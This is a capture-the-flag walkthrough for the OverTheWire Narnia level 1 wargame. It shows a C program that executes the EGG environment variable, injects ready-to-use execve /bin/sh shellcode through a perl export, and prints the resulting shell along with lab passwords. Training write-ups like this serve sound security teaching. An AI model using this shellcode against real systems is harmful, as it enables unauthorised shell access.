@@ -1,0 +1,62 @@
+This is a solution guide to the Narnia0 Level at 
+http://overthewire.org/wargames/narnia/
+
+This write-up was created on 27 February 2015.
+
+First connect to the lab
+-> ssh narnia1@narnia.labs.overthewire.org
+-> Enter the following as the password efeidiedae
+
+Change directories to the narnia games folder
+-> cd /narnia
+
+First let's examine how we get the password for the next level.
+
+-> less narnia1.c
+
+int main(){
+        int (*ret)();
+
+        if(getenv("EGG")==NULL){    
+                printf("Give me something to execute at the env-variable EGG\n");
+                exit(1);
+        }
+
+        printf("Trying to execute EGG!\n");
+        ret = getenv("EGG");
+        ret();
+
+        return 0;
+}
+
+So this seems to be a pretty easy challenge. When we examine the source code
+we can see that the first thing that occurs is that a void pointer is created.
+
+Next, there are two functions that get an environment variable called "EGG" and
+if the "EGG" environment variable exists then it retrieves the pointer to that
+environment variable and stores it in ret.
+
+Last it will execute whatever "EGG" is pointing to as a function call. Essentially,
+it will attempt to execute anything that is placed in "EGG".
+
+So the first step is to grab some shellcode from 
+http://shell-storm.org/shellcode/files/shellcode-811.php
+
+Next, we grab all the bytes and place them into the "EGG" environment variable:
+export EGG=`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . 
+"\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80"'`
+
+Third, we run the vulnerable program with ./narnia1 and check that out.
+Now we have a shell!
+
+Let's doublecheck our creds with whoami and we get:
+$ whoami
+narnia2
+$ 
+
+So now we can retrieve our password like so:
+$ cat /etc/narnia_pass/narnia2
+nairiepecu
+$
+
+BINGO! level 2 password is nairiepecu
